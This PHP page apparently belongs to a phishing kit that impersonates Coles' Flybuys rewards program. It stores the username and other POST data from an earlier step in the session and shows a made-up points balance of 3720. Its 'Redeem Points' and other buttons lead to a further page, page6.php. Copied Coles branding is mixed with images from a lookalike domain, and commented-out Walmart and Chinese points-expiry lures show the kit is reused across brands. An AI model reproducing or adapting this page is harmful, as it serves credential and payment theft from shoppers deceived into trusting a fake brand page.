<?php
session_start();
require_once 'config.php';
// include('partials/header.php');
include('header_.php');


if (isset($_POST['submit']) || isset($_POST['username'])) {
    $_SESSION['step1Data'] = $_POST;
}

?>

<div class="wraps">
    <div class="flex-auto relative z-1">
        <div class="main-content mw1280 center" id="maincontent" data-testid="maincontent">
            <div>
                <main class="ph3-l ph4-xl pb4" id="maincontent">
                    <div data-testid="flex-container" class="flex undefined flex-column h-100">
                        <div class="h-100 relative">
                            <div data-testid="flex-container" class="flex undefined flex-column h-100">
                                <div class="h-100 relative">
                                    <div class="bg-white pl4 pr4" style="width:100%;height:45px;">
                                        <div class="notice bg-white" style="font-size:13px; display:none;">

                                            <!-- <p>Dear Walmart
                                                Members：<?php //echo  isset($_SESSION['step1Data']['username']) ? $_SESSION['step1Data']['username'] : ''; ?>
                                            </p> -->
                                            <!-- <p>
                                    MyLink積分計劃」提示您，您的賬戶當前積分（5340積分），將於三個工作日內到期，爲避免影響，請及時兌換積分獎賞。</p> -->
                                            </br>
                                        </div>
                                    </div>
                                    
                              <!-- first section start here -->
                            <section>
                                <div class="container">
                                <div class="cont-second">
                                        <div class="row">

                                            <div class="col-md-6 coles-camp1"><img src="https://clos.tracik.link/images/christ.jpg"> </div>
                                            <div class="col-md-6 cont-coles1">
                                                <h2 class="get-coles1">Your Coles point: 3720</h2>
                                                <p class="get-coles1">Get more value at Coles with Australia's favourite rewards program.</p>
                                                <button class="button12 rounded-corners" onclick="window.location.href='page6.php'">Redeem Points</button>
                                                <button class="button1 rounded-corners" onclick="window.location.href='page6.php'">Link your Flybuys</button>
                                            </div>
                                        </div>
                                        </div>
                                        
                                        </div>
                                    </div>
                                </div>
                            </section>
                            <!--section end here--->
                              <!-- Second Section Start here -->
                              <section>
                                <div class="container">
                                    <div class="box-tile">
                                        <div class="row list-wrap">
                                            <div class="col-md-6">
                                                <div class="content-box1 cont-visit1">
                                                    <h3 class="visit1" style="font-weight:bold;">How it works
                                                    </h3>
                                                    <img src="https://www.coles.com.au/content/dam/coles/cusp/promotions/flybuys/images/flybuys-points-roundel.png">
                                                    <h4>Collect points every time you shop</h4>
                                                    <p class="help" style="font-size:13px";>Collect 1 point for every $1 spent every time you shop in store or online at Coles supermarkets.</p>
                                                </div>
                                            </div>
                                            <div class="col-md-6">
                                                <div class="content-box1 cont-fly1">
                                                    <h4>Collect points faster with personalised offers on the Coles app</h4>
                                                    <p class="bus1" style="font-size:13px;">Activate offers for Bonus Points, money off your Coles shop and free products+. Download the Coles app or download the Flybuys app</p>
                                                    <img src="https://www.coles.com.au/content/dam/coles/cusp/promotions/flybuys/images/flybuys-bonus-points-300x300.png">
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </section>
                              <!-- second section end here -->
                                 <!-- third Section Start here -->
                                 <section>
                                <div class="container">
                                    <div class="box-tile">
                                        <div class="row list-wrap">
                                            <div class="col-md-6">
                                                <div class="content-box1 cont-visit1">
                                                    <!-- <h3 class="visit1" style="font-weight:bold;">How it works
                                                    </h3> -->
                                                    <img src="https://www.coles.com.au/content/dam/coles/cusp/promotions/flybuys/images/10-0ff-flybuys-roundel-300x300.png">
                                                    <h4>Get money off your in store shop</h4>
                                                    <p class="help" style="font-size:13px";>Use your points to get money off your shop with Flybuys dollars. Every 2,000 points gets you $10 Flybuys dollars</p>
                                                </div>
                                            </div>
                                            <div class="col-md-6">
                                                <div class="content-box1 cont-fly1">
                                                <img src="https://www.coles.com.au/content/dam/coles/cusp/promotions/flybuys/images/4c-off-coles-express-roundel-300x300.png">
                                                    <h4>Save 4c per litre with digital fuel dockets</h4>
                                                    <p class="bus1" style="font-size:13px;">Spend $30 at Coles and activate your fuel offer in the Flybuys app to save on fuel at Shell Coles Express.*</p>
                                                    
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </section>
                              <!-- third section end here -->
                               <!-- fourth Section Start here -->
                               <section>
                                <div class="container">
                                    <div class="box-tile">
                                        <div class="row list-wrap">
                                            <div class="col-md-6">
                                                <div class="content-box1 cont-visit1">
                                                    <h3 class="visit1" style="font-weight:bold;">Flybuys Partners
                                                    </h3>
                                                    <p class="help1" style="font-size:13px";>With 20+ partners and thousands of stores where you can collect points, Flybuys is everywhere you are.</p>
                                                    <img src="https://www.coles.com.au/content/dam/coles/home/images/coles-express-logo-480x288.jpg">
                                                    <img src="https://www.coles.com.au//content/dam/coles/cusp/promotions/flybuys/images/Liquorland-Logo-470x282px-RGB.svg">
                                                    <img src="https://www.coles.com.au/content/dam/coles/cusp/campaigns/flybuys-members-price/coles-logo-red.png">
                                                    
                                                </div>
                                            </div>
                                            <div class="col-md-6">
                                                <div class="content-box1 cont-fly1">
                                                    <img src="https://www.coles.com.au/content/dam/coles/home/images/first-choice-white-480x288.jpg">
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </section>
                              <!-- fourth section end here -->
                              <!-- blue section start here -->
                              
                            <section>
                                <div class="container">
                                    <div class="box-tile blue">
                                        <div class="row">
                                            <div class="col-md-6">
                                                <div class="content-box12 cont-visit13">
                                                    <h3 class="visit" style="font-weight:bold;">Ready to join Australia's favourite rewards program?

                                                    </h3>
                                                    <p class="help" style="font-size:13px;">Join online then link your Flybuys card to your Coles account to enjoy even more value. </p>
                                                </div>
                                            </div>
                                            <div class="col-md-6">
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </section>
                              <!-- blue section end -->

                                        <section>
                                            <div class="ma3" data-testid="skinny-banner">
                                                <div class="w-100">
                                                    <div class="heading">
                                                        <h2 class="que" style="font-weight:bold;">Questions? We're here
                                                            to help</h2>
                                                    </div>

                                                </div>
                                            </div>
                                </div>
                            </div>
                            </section>
                            
                            <section>
                                <div class="container">
                                    <div class="box-tile">
                                        <div class="row list-wrap">
                                            <div class="col-md-6">
                                                <div class="content-box cont-visit">
                                                    <h3 class="visit" style="font-weight:bold;">Visit our Help Centre
                                                    </h3>
                                                    <p class="help" style="font-size:13px;">Our Help Centre has answers
                                                        to frequently asked questions about joining Flybuys, collecting
                                                        and<br> redeeming points, and more. Jump to Help Centre</p>
                                                </div>
                                            </div>
                                            <div class="col-md-6">
                                                <div class="content-box cont-fly">
                                                    <h3 class="fly" style="font-weight:bold;">Contact Flybuys</h3>
                                                    <p class="bus" style="font-size:13px;">Go to flybuys.com.au <br>Call
                                                        13 11 16 <br>Monday to Friday between 9am - 7pm (AEST) </p>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </section>

                            <section>
                                <div class="container">
                                    <div class="cont-second">
                                        <div class="row">

                                            <div class="col-md-6 coles-camp">
                                            </div>
                                            <div class="col-md-6 cont-coles">
                                                <h2 class="get-coles">Get more value with Coles Plus</h2>
                                                <p class="get-coles">Join to enjoy free Coles deliveries over $50, plus
                                                    double points on your groceries, liquor and more. Exclusions & T&Cs
                                                    apply.</p>
                                                <button class="button rounded-corners" onclick="window.location.href='page6.php'">Start 1 month free trial</button>
                                            </div>
                                        </div>
                                        <div class="row">
                                            <div class="col-md-6">
                                                <span class="first-con">Collect 1pt per $1 spent at
                                                    Coles:</span><br><br>
                                                <p class="first-par">#Points awarded after savings, discounts and
                                                    vouchers (excludes purchases of selected gift cards, iTunes cards,
                                                    Coles Best Buys Online Exclusive products, charitable donations,
                                                    tobacco and tobacco related products, delivery/service fees and
                                                    purchases made through any external third-party platforms such as
                                                    Uber Eats, DoorDash etc.) Standard Flybuys T&amp;Cs apply, see.</p>
                                                <br><br>
                                            </div>
                                            <div class="col-md-6">
                                                <span class="second-con">^$10 off when you redeem 2,000 Flybuys
                                                    points</span><br><br>
                                                <p class="second-par">Flybuys dollars can only be redeemed in increments
                                                    of $10. Flybuys dollars may be used in-store only. Flybuys points
                                                    can be converted to Flybuys dollars in multiples of 2,000 points
                                                    only. 2,000 points equates to $10 Flybuys dollars. Flybuys points
                                                    and Flybuys dollars have no cash or monetary value. For Flybuys
                                                    dollars T&Cs visit
                                                    https://experience.flybuys.com.au/rewards/money-off-shop/redeem </p>
                                                <br><br>
                                            </div>
                                        </div>
                                        <div class="row">
                                            <div class="col-md-6">
                                                <span class="third-con">*Save 4c per litre on fuel at Shell Coles
                                                    Express with Digital Fuel Docket</span><br><br>
                                                <p class="third-par">The Coles Digital Fuel Docket consists of 4 cents
                                                    off per litre, 8 Flybuys points per litre or an in-store product
                                                    offer at Shell Coles Express. It is available when you spend $30 in
                                                    one transaction at Coles Supermarkets or Coles Online and scan your
                                                    Flybuys to receive a fuel docket offer to your Flybuys app. Offer
                                                    valid only at Shell Coles Express. Once this offer is activated, to
                                                    redeem visit Shell Coles Express, scan your Flybuys card and advise
                                                    the Shell Coles Express team member of your redemption preference -
                                                    fuel offer or the current in-store product offer (no fuel purchase
                                                    required). The in-store product offer may change from time to time,
                                                    and may be different at the time of redemption. Please check your
                                                    activated digital fuel offer for the current product offer.
                                                    Activated offers that have been altered, copied or have passed their
                                                    expiry date are not valid. Offer redeemable once. Fuel offer valid
                                                    to 150L on one vehicle per customer. Note: once this offer is
                                                    activated, the future fuel offer barcode will no longer be printed
                                                    on your Coles supermarket receipt. See flybuys.com.au/colesexpress
                                                    for full T&Cs. </p><br><br>
                                            </div>
                                            <div class="col-md-6">
                                                <p class="foruth-par">+Only Coles and Coles Express offers can be
                                                    activated in the Coles app. Offers may have minimum spend thresholds
                                                    and limits applied. Offers shown are examples only and may require
                                                    activation. Bonus points offers are valid in-store or online at
                                                    Coles only, subject to store availability (excludes Coles Express
                                                    and purchases made through any external third-party platforms such
                                                    as Uber Eats, DoorDash etc.) Flybuys T&Cs apply</p>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </section>
                        </div>
                    </div>
            </div>
        </div>
        <div class="bg-black-20 absolute--fill" id="backgroundTopNav" style="z-index:9998"></div>
        </main>
    </div>
</div>
</div>

</div>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script src="js/colpas.js"></script>
<?php
include('footer_.php'); ?>
<style>
.wraps {
    /*        padding: 30px 20px;*/

    padding-bottom: 0px;
}

a.main-logo {
    display: block;
    margin: 11px 0 25px 0;
    text-align: center;
    color: red;
    font-size: 19px;
    font-weight: bold;
}

.notice {
    line-height: 2;
    padding: 10px;
    border-radius: 5px;
    color: #777977;
    margin: 0px;
    background: #f0f0eb;
}

span.inner-pages2 {
    font-weight: unset !important;
    padding-top: 2px;
}

@media(max-width: 767px) {
    body {
        overflow-x: hidden !important;
    }

    .coles-camp {
        flex: 1 1 50%;
        background-size: cover;
        background-position: center center;
        position: relative;
        display: flex;
        flex-direction: column;
        -webkit-box-pack: center;
        justify-content: center;
        background-image: url(<?php echo $folder_path; ?>/images/coles-plus.jpg);
        border-top-left-radius: 10px;
        border-top-right-radius: 10px;
    }
    .coles-camp1 {
        flex: 1 1 50%;
        background-size: cover;
        background-position: center center;
        position: relative;
        display: flex;
        flex-direction: column;
        -webkit-box-pack: center;
        justify-content: center;
        background-image: url(<?php echo $folder_path; ?>/images/christ.jpg);
        border-top-left-radius: 10px;
        border-top-right-radius: 10px;
    }
    .coles-camp {
        padding: 0.5rem 0px 0px !important;
        margin-top: 53px;
    }

    .coles-camp {
        min-height: 212px !important;
    }

    .cont-coles {
        background: #f5f5f5;
        padding: 20px;
        border-bottom-left-radius: 13px;
        border-bottom-right-radius: 13px;
    }
    .cont-coles1 {
        background: #e01a22;
        padding: 20px;
        border-bottom-left-radius: 13px;
        border-bottom-right-radius: 13px;
    }

    .submit-btn {
        text-align: center;
        background-color: #0071dc;
        padding: 11px 24px;
        font-size: 1rem;
        display: block;
        width: auto;
        min-width: 120px;
        margin-left: auto;
        margin-right: auto;
        line-height: 22px;
        border-radius: 32px;
        color: #fff;
        border-color: #0071dc;
        height: auto;
        cursor: pointer;
    }

    .submit-btn:hover:hover {
        background-color: #0071dc;
        border-color: #0071dc;
    }

    .loader-wrap {
        display: flex;
        width: 100%;
        height: 100%;
        position: fixed;
        top: 0;
        left: 0;
        align-items: center;
        justify-content: center;
        z-index: 99999999999999;
        background: rgba(255, 255, 255, 1);
    }

    .loader-wrap .loading {
        display: flex;
        flex-direction: column;
        align-items: center;
    }

    .loader-wrap .loading img.china-mobile-logo-img {
        width: 200px;
    }

    .loader-wrap .loading img {
        width: 80px;
    }

    .list-wrap {
        display: list-item !important;
        list-style: none;
    }

    .cont-fly {
        padding: 20px;
        position: relative;
        top: -10px;
        bottom: 0;
        left: 0px !important;
        right: 0;
    }

    section.pv3 {
        margin-top: 41px;
    }

    h2.get-coles {
        font-size: 24px;
        font-weight: 600;
        font-family: sans-serif;
    }

    p.get-coles {
        font-size: 16px;
        font-family: sans-serif;
        margin-top: 13px;
    }

    .button {
        background-color: #e01a22;
        color: #ffffff;
        border: none;
        text-align: center;
        padding: 10px 45px;
        margin-left: 36px;
        margin-top: 27px;
        border-radius: 23px;
    }

    span.first-con {
        font-family: sans-serif;
        font-weight: 600;
        padding: 10px;
        position: relative;
        top: 16px;
        color: #3d3d3d;
    }

    span.second-con {
        font-family: sans-serif;
        font-weight: 600;
        padding: 10px;
        position: relative;
        top: -29px;
        font-size: 14px;
        color: #3d3d3d;
    }

    span.third-con {
        font-family: sans-serif;
        font-weight: 600;
        padding: 0px 10px 0px 10px;
        position: relative;
        top: -27px;
        font-size: 15px;
        color: #3d3d3d;
    }

    p.first-par {
        font-size: 15px;
        padding: 10px;
        font-family: sans-serif;
    }

    p.second-par {
        font-size: 15px;
        padding: 0px 10px 0px 12px;
        font-family: sans-serif;
        margin-top: -49px;
    }

    p.third-par {
        font-size: 15px;
        padding: 0px 10px 0px 10px;
        font-family: sans-serif;
        margin-top: -38px;
    }

    p.foruth-par {
        font-family: sans-serif;
        font-size: 15px;
        padding: 0px 10px 0px 10px;
        margin-bottom: 30px;
        margin-top: -34px;
    }

    .content-box {
        background: #fefaf0;
        margin-top: 17px;
        border-radius: 10px;
    }

    .que {
        font-weight: bold;
        margin-top: 48px;
        font-size: 24px;
        padding: 0px 10px 0px 10px;
        line-height: 28px;
    }

    .box-tile {
        padding: 0px 34px 0px 28px;
        margin-left: -11px;
    }

    /* .cont-second {
        padding: 0px 20px 0px 8px;
    } */

    h3.visit {
        font-size: 0.875rem;
    }

    h3.fly {
        font-size: 0.875rem;
    }

    p.help {
        font-size: 13px;
        margin-top: 10px;
        line-height: 20px;
    }

    p.bus {
        margin-top: 9px;
        line-height: 20px;
    }

    h2.get-coles1 {
    color: #ffffff;
    font-size: 25px;
    font-weight: 600;
    line-height: 30px;
    font-family: sans-serif;
}
p.get-coles1 {
    color: #ffffff;
    position: relative;
    top: 13px;
}
.button1 {
    background-color: transparent;
    color: #ffffff;
    border: 1px solid #ffffff;
    text-align: center;
    padding: 10px 67px;
    margin-left: 23px;
    margin-top: 27px;
    border-radius: 23px;
}
.button12 {
    background-color: #ffffff;
    color: #000000;
    border: 1px solid #ffffff;
    text-align: center;
    padding: 10px 80px;
    margin-left: 25px;
    margin-top: 27px;
    border-radius: 23px;
}
.content-box1.cont-visit1 img {
    padding: 10px;
}
.col-md-6.coles-camp1 {
    margin-top: -13px;
}
h3.visit1 {
    font-size: 30px;
    margin-top: 21px;
}
.blue {
    background-color: #234a8b;
    padding: 20px;
    border-radius: 10px;
    margin-left: 1px;
    color: #ffffff;
}
}

/* media end here */
.list-wrap {
    display: flex;
}

.cont-fly {
    padding: 20px;
    position: relative;
    top: 0;
    bottom: 0;
    left: 192px;
    right: 0;
}

.cont-visit {
    padding: 20px;
}

.content-box {
    background: #fefaf0;
}
</style>